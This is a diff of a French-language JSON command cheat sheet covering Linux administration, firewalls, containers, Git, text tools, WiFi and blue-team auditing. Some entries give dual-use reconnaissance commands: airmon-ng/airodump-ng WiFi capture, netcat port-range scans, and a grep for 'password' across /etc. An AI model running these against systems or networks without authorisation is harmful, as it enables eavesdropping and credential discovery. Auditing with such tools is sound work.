+    "detailedExplanation": "Intercepte et affiche tous les appels systeme (open, read, write, connect, etc.) d'un processus en cours. Outil ultime de debug quand un programme se comporte bizarrement.",
+    "options": ["-p PID : attacher a un processus", "-e trace=network : filtrer reseau", "-f : suivre les forks", "-c : statistiques"],
+    "examples": ["strace -p 1234 -e trace=network", "strace -f -e trace=open,read ls /tmp"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "crontab -l",
+    "description": "Lister les taches planifiees (cron)",
+    "category": "Admin Sys",
+    "detailedExplanation": "Affiche les taches cron de l'utilisateur courant. Verifier aussi /etc/crontab, /etc/cron.d/, et les crons des autres utilisateurs (sudo crontab -u user -l).",
+    "examples": ["crontab -l", "sudo crontab -u www-data -l", "ls /etc/cron.d/"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "useradd -m -s /bin/bash [user]",
+    "description": "Creer un utilisateur avec home",
+    "category": "Admin Sys",
+    "detailedExplanation": "Cree un nouvel utilisateur systeme avec son repertoire home (-m) et le shell bash. Puis definir le mot de passe avec passwd.",
+    "options": ["-m : creer le home", "-s : shell", "-G : groupes supplementaires", "-d : chemin home custom"],
+    "examples": ["useradd -m -s /bin/bash -G sudo,docker newuser", "passwd newuser"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "chmod 750 [file]",
+    "description": "Modifier les permissions d'un fichier",
+    "category": "Admin Sys",
+    "detailedExplanation": "Change les permissions : 7=rwx (proprietaire), 5=r-x (groupe), 0=--- (autres). Les bits speciaux : 4000=SUID, 2000=SGID, 1000=sticky.",
+    "options": ["u/g/o : user/group/others", "+/- : ajouter/retirer", "r/w/x : read/write/execute"],
+    "examples": ["chmod 755 script.sh", "chmod u+x deploy.sh", "chmod -R 640 /etc/nginx/"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "chown user:group [file]",
+    "description": "Changer le proprietaire d'un fichier",
+    "category": "Admin Sys",
+    "detailedExplanation": "Modifie le proprietaire et/ou le groupe d'un fichier ou dossier. Seul root peut changer le proprietaire (securite anti-escalade).",
+    "options": ["-R : recursif", "user: : changer seulement le proprietaire", ":group : changer seulement le groupe"],
+    "examples": ["chown www-data:www-data /var/www/html/ -R", "chown root:root /etc/crontab"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "tar -czf archive.tar.gz [dossier]",
+    "description": "Creer une archive compressee",
+    "category": "Admin Sys",
+    "detailedExplanation": "Cree une archive tar compressee avec gzip. c=create, z=gzip, f=fichier. Pour extraire : x=extract.",
+    "options": ["-c : creer", "-x : extraire", "-z : gzip", "-j : bzip2", "-v : verbose", "-f : fichier"],
+    "examples": ["tar -czf backup.tar.gz /etc/", "tar -xzf archive.tar.gz -C /tmp/"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "rsync -avz [src] [dest]",
+    "description": "Synchroniser fichiers (local ou distant)",
+    "category": "Admin Sys",
+    "detailedExplanation": "Copie incrementale intelligente : ne transfere que les differences. Preserves les permissions, dates, liens symboliques. Indispensable pour les backups.",
+    "options": ["-a : archive (preserve tout)", "-v : verbose", "-z : compression", "--delete : supprimer les extras", "-e ssh : via SSH"],
+    "examples": ["rsync -avz /data/ user@backup:/data/", "rsync -avz --delete /var/www/ /backup/www/"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "ssh-keygen -t ed25519",
+    "description": "Generer une cle SSH Ed25519",
+    "category": "Securite",
+    "detailedExplanation": "Genere une paire de cles SSH avec l'algorithme Ed25519 (plus securise et rapide que RSA). La cle publique (.pub) est copiee sur le serveur, la cle privee reste locale.",
+    "examples": ["ssh-keygen -t ed25519 -C 'admin@server'", "ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "ssh -L [local]:[remote_host]:[remote] [user@server]",
+    "description": "Tunnel SSH local (port forwarding)",
+    "category": "Securite",
+    "detailedExplanation": "Cree un tunnel chiffre qui redirige le port local vers un port distant via le serveur SSH. Permet d'acceder a des services internes de maniere securisee.",
+    "examples": ["ssh -L 8080:localhost:80 admin@server", "ssh -L 5432:db-server:5432 admin@bastion"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "iptables -L -n -v",
+    "description": "Lister les regles du firewall",
+    "category": "Securite",
+    "detailedExplanation": "Affiche toutes les regles iptables avec compteurs de paquets/octets. -n evite la resolution DNS (plus rapide), -v ajoute les details (interface, compteurs).",
+    "options": ["-t nat : table NAT", "-t mangle : table mangle", "--line-numbers : numeros de regle"],
+    "examples": ["iptables -L -n -v", "iptables -t nat -L -n -v", "iptables -S"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
+    "description": "Autoriser SSH dans le firewall",
+    "category": "Securite",
+    "detailedExplanation": "Ajoute une regle autorisant les connexions TCP entrantes sur le port 22 (SSH). L'ordre des regles est important : la premiere qui match s'applique.",
+    "options": ["-A : ajouter en fin", "-I : inserer en debut", "-D : supprimer", "-p : protocole", "--dport : port destination", "-j : action (ACCEPT/DROP/REJECT)"],
+    "examples": ["iptables -A INPUT -p tcp --dport 80 -j ACCEPT", "iptables -A INPUT -j DROP"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "ufw enable && ufw allow ssh",
+    "description": "Activer UFW et autoriser SSH",
+    "category": "Securite",
+    "detailedExplanation": "UFW (Uncomplicated Firewall) est l'interface simplifiee d'iptables sur Ubuntu/Debian. Plus lisible que les regles iptables brutes.",
+    "options": ["allow : autoriser", "deny : bloquer", "status : voir les regles", "numbered : avec numeros"],
+    "examples": ["ufw allow 80/tcp", "ufw allow from 192.168.1.0/24 to any port 22", "ufw status numbered"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "passwd [user]",
+    "description": "Changer le mot de passe d'un utilisateur",
+    "category": "Securite",
+    "detailedExplanation": "Change le mot de passe d'un utilisateur. Le hash est stocke dans /etc/shadow. Sans argument, change le mot de passe de l'utilisateur courant.",
+    "options": ["-l : verrouiller le compte", "-u : deverrouiller", "-e : forcer le changement au prochain login", "-S : afficher le statut"],
+    "examples": ["passwd", "sudo passwd -l compromised_user", "sudo passwd -e newuser"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "gpg --gen-key",
+    "description": "Generer une paire de cles GPG",
+    "category": "Securite",
+    "detailedExplanation": "Cree une paire de cles GPG pour le chiffrement et la signature de fichiers, emails et commits git. La cle privee est protegee par une passphrase.",
+    "examples": ["gpg --gen-key", "gpg -e -r user@email.com fichier.txt", "gpg -d fichier.txt.gpg"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "openssl rand -base64 32",
+    "description": "Generer un secret aleatoire",
+    "category": "Securite",
+    "detailedExplanation": "Genere 32 octets aleatoires cryptographiquement surs et les encode en base64. Utile pour generer des cles API, tokens, mots de passe.",
+    "examples": ["openssl rand -base64 32", "openssl rand -hex 16", "openssl rand -base64 48 | tr -d '\\n'"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "docker ps -a",
+    "description": "Lister tous les conteneurs Docker",
     "category": "Cloud",
-    "iconName": "cloud",
-    "colorHex": "06B6D4",
-    "detailedExplanation": "Vérifie si le versioning est activé sur un bucket S3 pour se prémunir contre les suppressions accidentelles ou ransomwares.",
+    "detailedExplanation": "Affiche tous les conteneurs (en cours et arretes) avec leur ID, image, commande, statut, ports exposes et nom.",
+    "options": ["-a : tous (inclus arretes)", "-q : IDs seulement", "--format : format custom", "-f : filtrer"],
+    "examples": ["docker ps -a", "docker ps -q --filter status=exited"],
     "dangerLevel": 1
   },
   {
-    "command": "az role assignment list --all",
-    "description": "Audit RBAC complet Azure",
+    "command": "docker logs -f [container]",
+    "description": "Suivre les logs d'un conteneur",
     "category": "Cloud",
-    "iconName": "cloud",
-    "colorHex": "06B6D4",
-    "detailedExplanation": "Liste toutes les assignations de rôles au sein de la souscription Azure pour s'assurer du principe de moindre privilège.",
+    "detailedExplanation": "Affiche les logs stdout/stderr d'un conteneur et les suit en temps reel (-f). Equivalent de journalctl -f pour les conteneurs.",
+    "options": ["-f : suivre", "--tail N : N dernieres lignes", "--since : depuis quand", "-t : timestamps"],
+    "examples": ["docker logs -f --tail 100 nginx", "docker logs --since 10m web-app"],
     "dangerLevel": 1
   },
   {
-    "command": "kubectl get pods --all-namespaces -o wide",
+    "command": "docker exec -it [container] /bin/bash",
+    "description": "Ouvrir un shell dans un conteneur",
+    "category": "Cloud",
+    "detailedExplanation": "Execute une commande a l'interieur d'un conteneur en cours d'execution. -it alloue un TTY interactif. Permet de debugger depuis l'interieur du conteneur.",
+    "examples": ["docker exec -it web-app /bin/bash", "docker exec web-app cat /etc/nginx/nginx.conf"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "docker build -t [image] .",
+    "description": "Construire une image Docker",
+    "category": "Cloud",
+    "detailedExplanation": "Construit une image Docker a partir du Dockerfile dans le repertoire courant. -t donne un nom et optionnellement un tag a l'image.",
+    "options": ["-t : tag (nom:version)", "-f : Dockerfile specifique", "--no-cache : sans cache", "--build-arg : argument de build"],
+    "examples": ["docker build -t myapp:1.0 .", "docker build -t myapp:latest -f Dockerfile.prod ."],
+    "dangerLevel": 1
+  },
+  {
+    "command": "docker-compose up -d",
+    "description": "Demarrer une stack Docker Compose",
+    "category": "Cloud",
+    "detailedExplanation": "Demarre tous les services definis dans docker-compose.yml en arriere-plan (-d). Cree les reseaux, volumes et conteneurs necessaires.",
+    "options": ["-d : detached (arriere-plan)", "--build : rebuild les images", "--force-recreate : recreer les conteneurs", "down : arreter et supprimer"],
+    "examples": ["docker-compose up -d", "docker-compose down -v", "docker-compose logs -f"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "docker stats",
+    "description": "Monitoring CPU/RAM des conteneurs",
+    "category": "Cloud",
+    "detailedExplanation": "Affiche en temps reel l'utilisation CPU, memoire, I/O reseau et I/O disque de chaque conteneur. Equivalent de top pour Docker.",
+    "examples": ["docker stats", "docker stats --no-stream --format 'table {{.Name}}\\t{{.CPUPerc}}\\t{{.MemUsage}}'"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "kubectl get pods -A",
     "description": "Lister tous les pods Kubernetes",
     "category": "Cloud",
-    "iconName": "cloud",
-    "colorHex": "0891B2",
-    "detailedExplanation": "Affiche l'état de tous les pods sur tous les namespaces Kubernetes avec les IPs et les nœuds associés.",
-    "options": ["--all-namespaces : inclure tout les NS", "-o wide : affichage étendu"],
-    "examples": ["kubectl get pods -n production -o wide"],
+    "detailedExplanation": "Affiche tous les pods dans tous les namespaces avec leur statut, nombre de restarts, et age. Premier reflexe pour verifier l'etat d'un cluster.",
+    "options": ["-A : tous les namespaces", "-o wide : plus de details", "-w : watch en temps reel", "--sort-by=.status.startTime"],
+    "examples": ["kubectl get pods -A", "kubectl get pods -n production -o wide"],
     "dangerLevel": 1
   },
   {
-    "command": "terraform plan -out=tfplan && terraform apply tfplan",
-    "description": "Déploiement IaC sécurisé Terraform",
+    "command": "kubectl logs -f [pod]",
+    "description": "Suivre les logs d'un pod",
     "category": "Cloud",
-    "iconName": "api",
-    "colorHex": "7C3AED",
-    "detailedExplanation": "Génère un plan d'exécution Terraform valide (tfplan) puis applique les changements, garantissant la cohérence du déploiement.",
-    "options": ["-out=tfplan : sauvegarde du plan", "apply tfplan : exécute le plan approuvé"],
-    "examples": ["terraform plan -out=tfplan -var-file=prod.tfvars"],
-    "dangerLevel": 2
-  },
-  {
-    "command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
-    "description": "Générer un cert TLS auto-signé",
-    "category": "SÉCURITÉ",
-    "iconName": "lock",
-    "colorHex": "EF4444",
-    "detailedExplanation": "Crée un certificat X.509 auto-signé RSA 4096 bits valable 1 an. Utile pour les serveurs de test ou les communications internes.",
-    "options": ["-newkey rsa:4096 : clé RSA de 4096 bits", "-nodes : pas de passphrase sur la clé privée", "-days 365 : durée de validité"],
-    "examples": ["openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 730 -nodes -subj \"/CN=localhost\""],
-    "dangerLevel": 2
-  },
-  {
-    "command": "openssl s_client -connect [host]:443 -tls1_2",
-    "description": "Vérifier la config TLS d'un serveur",
-    "category": "SÉCURITÉ",
-    "iconName": "lock",
-    "colorHex": "DC2626",
-    "detailedExplanation": "Établit une connexion TLS 1.2 vers le serveur cible et affiche les détails du certificat, le cipher négocié et la chaîne de confiance.",
-    "options": ["-tls1_2 : forcer TLS 1.2", "-tls1_3 : forcer TLS 1.3", "| openssl x509 -text : afficher le cert"],
-    "examples": ["openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates"],
+    "detailedExplanation": "Affiche les logs stdout d'un pod et les suit en temps reel. Pour les pods multi-conteneurs, specifier -c container_name.",
+    "options": ["-f : suivre", "-c : conteneur specifique", "--previous : logs du conteneur precedent (apres crash)", "--tail N : N dernieres lignes"],
+    "examples": ["kubectl logs -f web-pod", "kubectl logs -f web-pod -c nginx --tail 50"],
     "dangerLevel": 1
+  },
+  {
+    "command": "kubectl describe pod [pod]",
+    "description": "Details complets d'un pod",
+    "category": "Cloud",
+    "detailedExplanation": "Affiche toutes les informations d'un pod : spec, conditions, events, volumes, limites de ressources. Indispensable pour debugger un pod en CrashLoopBackOff.",
+    "examples": ["kubectl describe pod web-pod", "kubectl describe node worker-1"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "iwconfig",
+    "description": "Configuration des interfaces WiFi",
+    "category": "Wireless",
+    "detailedExplanation": "Affiche le SSID connecte, la frequence, la qualite du signal (Link Quality), la puissance d'emission et le mode (Managed/Monitor/Master).",
+    "examples": ["iwconfig", "iwconfig wlan0"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "nmcli device wifi list",
+    "description": "Lister les reseaux WiFi disponibles",
+    "category": "Wireless",
+    "detailedExplanation": "Interface en ligne de commande pour NetworkManager. Affiche les SSID a portee avec la force du signal, le canal, le debit et la securite (WPA2/WPA3).",
+    "examples": ["nmcli device wifi list", "nmcli device wifi connect 'MonSSID' password 'motdepasse'"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "airmon-ng start wlan0",
+    "description": "Passer une carte WiFi en mode monitor",
+    "category": "Wireless",
+    "detailedExplanation": "Active le mode monitor sur une interface WiFi, permettant la capture de tous les paquets WiFi a portee (pas seulement ceux du reseau connecte). Prerequis pour l'audit WiFi.",
+    "examples": ["airmon-ng start wlan0", "airmon-ng stop wlan0mon"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "airodump-ng wlan0mon",
+    "description": "Scanner les reseaux WiFi (mode monitor)",
+    "category": "Wireless",
+    "detailedExplanation": "Capture les trames WiFi en mode monitor et affiche les points d'acces (BSSID, canal, chiffrement, puissance) et les clients associes.",
+    "examples": ["airodump-ng wlan0mon", "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"],
+    "dangerLevel": 3
+  },
+  {
+    "command": "grep -rn [pattern] [path]",
+    "description": "Rechercher un motif dans des fichiers",
+    "category": "Texte",
+    "detailedExplanation": "Recherche recursivement un motif dans tous les fichiers d'un repertoire. -r recursif, -n numeros de ligne. Outil fondamental pour l'analyse de code et de logs.",
+    "options": ["-r : recursif", "-n : numeros de ligne", "-i : insensible a la casse", "-l : noms de fichiers seulement", "-v : inverser (lignes sans le motif)", "-c : compter", "--include='*.py' : filtrer par extension"],
+    "examples": ["grep -rn 'password' /etc/", "grep -rni 'error\\|fail' /var/log/syslog"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "awk '{print $1, $NF}' [file]",
+    "description": "Extraire des colonnes de texte",
+    "category": "Texte",
+    "detailedExplanation": "Langage de traitement de texte colonne par colonne. $1=premiere colonne, $NF=derniere, $0=ligne entiere. Peut filtrer, calculer et reformater.",
+    "options": ["-F: : separateur", "NR : numero de ligne", "BEGIN/END : avant/apres traitement"],
+    "examples": ["awk -F: '{print $1, $7}' /etc/passwd", "awk '$3 > 1000' /etc/passwd"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "sed 's/old/new/g' [file]",
+    "description": "Remplacement de texte en flux",
+    "category": "Texte",
+    "detailedExplanation": "Stream editor : effectue des substitutions, suppressions et insertions ligne par ligne. Le /g remplace toutes les occurrences sur chaque ligne (pas seulement la premiere).",
+    "options": ["-i : modifier le fichier en place", "s/old/new/ : substitution", "/pattern/d : supprimer la ligne", "-n 'Np' : afficher la ligne N"],
+    "examples": ["sed -i 's/http/https/g' config.conf", "sed -n '10,20p' fichier.txt"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "sort | uniq -c | sort -rn",
+    "description": "Compter et trier les occurrences",
+    "category": "Texte",
+    "detailedExplanation": "Pipeline classique : trier, compter les doublons, retrier par nombre decroissant. Indispensable pour l'analyse de logs (top IPs, top erreurs, top URLs).",
+    "examples": ["cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "jq '.' [file.json]",
+    "description": "Parser et filtrer du JSON en CLI",
+    "category": "Texte",
+    "detailedExplanation": "Processeur JSON en ligne de commande. Colore, filtre, transforme et extrait des donnees JSON. Indispensable pour travailler avec des APIs REST.",
+    "options": [". : tout afficher (formate)", ".key : extraire une cle", ".[] : iterer un tableau", "select(.key == \"val\") : filtrer"],
+    "examples": ["curl -s api.example.com | jq '.'", "cat data.json | jq '.users[] | {name, email}'"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "wc -l [file]",
+    "description": "Compter les lignes d'un fichier",
+    "category": "Texte",
+    "detailedExplanation": "Compte les lignes (-l), mots (-w) ou octets (-c) d'un fichier. Simple mais tres utile en pipeline pour dimensionner des resultats.",
+    "examples": ["wc -l /var/log/syslog", "find . -name '*.py' | wc -l", "cat access.log | grep 404 | wc -l"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "tail -f /var/log/syslog",
+    "description": "Suivre un fichier de log en temps reel",
+    "category": "Texte",
+    "detailedExplanation": "Affiche les dernieres lignes d'un fichier et suit les nouvelles lignes ajoutees en temps reel. -F suit meme si le fichier est rotate (recreee).",
+    "options": ["-f : suivre", "-F : suivre + rouvrir si rotate", "-n N : N dernieres lignes"],
+    "examples": ["tail -f /var/log/auth.log", "tail -F /var/log/nginx/access.log | grep 500"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "git log --oneline --graph --all",
+    "description": "Historique git compact avec branches",
+    "category": "Git",
+    "detailedExplanation": "Affiche l'historique des commits en une ligne chacun avec un graphe ASCII des branches et merges. Vue d'ensemble rapide de l'etat du repo.",
+    "examples": ["git log --oneline --graph --all -20", "git log --oneline --author='admin' --since='1 week ago'"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "git diff --stat HEAD~5",
+    "description": "Resume des changements des 5 derniers commits",
+    "category": "Git",
+    "detailedExplanation": "Affiche un resume des fichiers modifies, lignes ajoutees/supprimees pour les 5 derniers commits. Utile pour revue rapide avant un push ou un merge.",
+    "examples": ["git diff --stat HEAD~5", "git diff --stat main..feature-branch"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "git stash && git stash pop",
+    "description": "Mettre de cote et restaurer des changements",
+    "category": "Git",
+    "detailedExplanation": "Sauvegarde temporairement les modifications non commitees (stash) pour changer de branche ou pull. Pop restaure les changements ensuite.",
+    "options": ["stash : sauvegarder", "stash pop : restaurer et supprimer", "stash list : lister", "stash drop : supprimer"],
+    "examples": ["git stash", "git stash pop", "git stash list"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "git bisect start",
+    "description": "Trouver le commit qui a introduit un bug",
+    "category": "Git",
+    "detailedExplanation": "Recherche binaire dans l'historique git pour identifier exactement quel commit a introduit une regression. Divise par deux le nombre de commits a tester a chaque etape.",
+    "examples": ["git bisect start", "git bisect bad HEAD", "git bisect good v1.0", "git bisect reset"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "git reflog",
+    "description": "Historique de toutes les actions git",
+    "category": "Git",
+    "detailedExplanation": "Journal de reference local qui enregistre chaque mouvement de HEAD : commits, checkouts, rebases, resets. Permet de recuperer des commits 'perdus' apres un reset --hard.",
+    "examples": ["git reflog", "git checkout HEAD@{3}"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "tmux new -s [name]",
+    "description": "Creer une session terminal persistante",
+    "category": "Admin Sys",
+    "detailedExplanation": "Cree une session terminal qui persiste meme apres deconnexion SSH. Permet de lancer des taches longues et de se reconnecter plus tard. Multiplexeur de terminal.",
+    "options": ["new -s name : nouvelle session nommee", "attach -t name : se rattacher", "ls : lister les sessions", "Ctrl+B d : detacher"],
+    "examples": ["tmux new -s deploy", "tmux attach -t deploy", "tmux ls"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "screen -S [name]",
+    "description": "Session screen persistante",
+    "category": "Admin Sys",
+    "detailedExplanation": "Alternative a tmux pour les sessions terminales persistantes. Plus ancien et present par defaut sur plus de distributions.",
+    "options": ["-S name : nommer la session", "-r : se rattacher", "-ls : lister", "Ctrl+A d : detacher"],
+    "examples": ["screen -S backup", "screen -r backup", "screen -ls"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "scp [file] user@host:/path/",
+    "description": "Copier un fichier via SSH",
+    "category": "Admin Sys",
+    "detailedExplanation": "Copie securisee de fichiers entre machines via le protocole SSH. Plus simple que rsync pour des copies ponctuelles.",
+    "options": ["-r : recursif (dossiers)", "-P port : port SSH custom", "-i key : cle privee specifique"],
+    "examples": ["scp backup.tar.gz admin@server:/backups/", "scp -r /var/www/ admin@server:/var/www/"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "watch -n 2 [command]",
+    "description": "Repeter une commande toutes les N secondes",
+    "category": "Admin Sys",
+    "detailedExplanation": "Execute une commande periodiquement et affiche le resultat en plein ecran. Ideal pour surveiller l'evolution d'un processus, d'une queue ou d'une metrique.",
+    "options": ["-n N : intervalle en secondes", "-d : surligner les differences", "-t : sans en-tete"],
+    "examples": ["watch -n 2 'ss -s'", "watch -d -n 1 'df -h'", "watch -n 5 'docker ps'"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "xargs -I{} [command] {}",
+    "description": "Construire des commandes depuis stdin",
+    "category": "Texte",
+    "detailedExplanation": "Lit des elements depuis stdin et les passe en argument a une commande. Permet de transformer une liste en serie de commandes executees en parallele.",
+    "options": ["-I{} : placeholder", "-P N : N en parallele", "-n N : N args par commande", "-0 : separateur null (avec find -print0)"],
+    "examples": ["find . -name '*.log' | xargs -I{} gzip {}", "cat urls.txt | xargs -P 5 -I{} curl -s {}"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "nc -zv [host] [port-range]",
+    "description": "Scanner des ports avec Netcat",
+    "category": "Diagnostic",
+    "detailedExplanation": "Teste la connectivite TCP sur un ou plusieurs ports. -z scan sans envoyer de donnees, -v verbose. Alternative legere a nmap pour des verifications rapides.",
+    "examples": ["nc -zv 192.168.1.1 22", "nc -zv 10.0.0.1 1-1024"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "nft list ruleset",
+    "description": "Afficher les regles nftables",
+    "category": "Securite",
+    "detailedExplanation": "Successeur d'iptables sur les noyaux modernes. nftables unifie IPv4/IPv6/ARP avec une syntaxe plus lisible et de meilleures performances.",
+    "examples": ["nft list ruleset", "nft list table inet filter"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "lynis audit system",
+    "description": "Audit de securite complet du systeme",
+    "category": "Blue Team",
+    "colorHex": "2563EB",
+    "detailedExplanation": "Effectue un audit de securite complet : configuration systeme, permissions, services, firewall, crypto, comptes utilisateurs. Genere un score de durcissement et des recommandations.",
+    "examples": ["lynis audit system", "lynis audit system --quick"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "openvas-start",
+    "description": "Scanner de vulnerabilites OpenVAS",
+    "category": "Blue Team",
+    "colorHex": "2563EB",
+    "detailedExplanation": "Lance le scanner de vulnerabilites OpenVAS (Greenbone). Effectue des scans automatises contre des machines pour detecter des CVE connues, des mauvaises configurations et des faiblesses.",
+    "examples": ["openvas-start", "gvm-cli socket --xml '<get_tasks/>'"],
+    "dangerLevel": 2
   }
 ]
